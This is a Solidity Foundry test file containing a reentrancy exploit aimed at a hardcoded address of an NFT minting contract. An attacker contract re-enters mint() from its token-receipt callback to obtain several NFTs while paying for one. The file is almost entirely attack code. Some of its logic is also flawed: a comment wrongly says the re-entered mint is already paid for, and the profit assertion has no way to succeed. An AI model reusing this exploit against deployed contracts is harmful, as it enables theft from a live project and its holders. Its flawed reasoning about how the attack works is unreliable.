// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC721 {
    function balanceOf(address owner) external view returns (uint256 balance);
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

interface IGuitarist {
    function mint(uint256 quantity) external payable;
    function publicSaleCost() external view returns (uint256);
    function MAX_SUPPLY() external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xA249d8F280BA32Ab3E95bDdf4F3DBDE059d62AC3;
    address attacker = address(this);
    ReentrancyAttack public attackContract;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll deploy the attack contract in the exploit
        // Ensure we have enough ETH for the initial mint
        deal(attacker, 1 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Deploy the attack contract
        ReentrancyAttack attack = new ReentrancyAttack(TARGET);

        // Transfer 0.05 ETH to the attack contract for the initial mint
        payable(address(attack)).transfer(0.05 ether);

        // Start the attack
        attack.startAttack();

        // Check that attacker balance increased (we got NFTs without paying full price)
        uint256 attackerNFTs = IERC721(TARGET).balanceOf(address(attack));
        assertGt(attackerNFTs, 1, "Should have minted more than 1 NFT through reentrancy");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

contract ReentrancyAttack is IERC721Receiver {
    IGuitarist public target;
    uint256 public reentrancyCount = 0;
    uint256 public maxReentrancy = 10; // Limit to avoid out of gas

    constructor(address _target) {
        target = IGuitarist(_target);
    }

    function startAttack() external payable {
        // Start by minting 1 NFT
        target.mint{value: target.publicSaleCost()}(1);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external override returns (bytes4) {
        // Only reenter if called from the target contract
        if (msg.sender == address(target)) {
            // Check if we should reenter
            if (reentrancyCount < maxReentrancy && target.totalSupply() < target.MAX_SUPPLY()) {
                reentrancyCount++;
                // Reenter the mint function
                // We don't send ETH here - the contract still has balance from initial call
                target.mint(1);
            }
        }
        return this.onERC721Received.selector;
    }

    // Allow receiving ETH
    receive() external payable {}
}

